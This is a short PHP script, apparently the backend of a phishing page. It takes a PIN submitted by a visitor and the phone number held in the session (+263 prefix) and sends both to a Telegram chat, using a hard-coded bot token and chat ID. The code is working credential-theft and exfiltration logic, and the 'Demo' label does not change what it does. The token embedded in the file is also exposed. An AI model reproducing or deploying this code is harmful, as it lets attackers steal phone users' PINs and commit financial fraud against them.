<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $pin = $_POST['pin'] ?? '';

    $botToken = '8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc';
    $chatId   = '-5193742613';

    $message = "🔐 Demo PIN Entered\n";
    $message .= "Phone: +263 " . ($_SESSION['phone'] ?? '') . "\n";
    $message .= "PIN: " . $pin . "\n";

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";

    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    file_get_contents($url . "?" . http_build_query($data));
}
?>